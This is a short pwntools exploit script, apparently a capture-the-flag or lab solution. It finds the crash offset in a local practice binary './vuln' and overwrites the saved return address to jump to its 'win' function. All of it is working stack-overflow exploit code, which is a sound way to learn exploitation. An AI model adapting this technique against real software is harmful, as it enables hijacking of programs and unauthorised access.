#!/usr/bin/env python3
from pwn import *
elf =context.binary = ELF('./vuln')

pattern  = cyclic(100)
io = process(elf.path)
io.recvuntil(b'Input: ')
io.sendline(pattern)
io.wait()

print(io.recvuntil(b'You said: '))

core = io.corefile
offset = cyclic_find(core.eip)
log.info(f"Offset: {offset}")

p = process(elf.path)
payload = flat(
    b'A' * offset,
    p32(elf.symbols['win'])
)
p.recvuntil(b'Input: ')
p.sendline(payload)
p.recvuntil(b'You win!')
print(p.recvline().decode().strip())
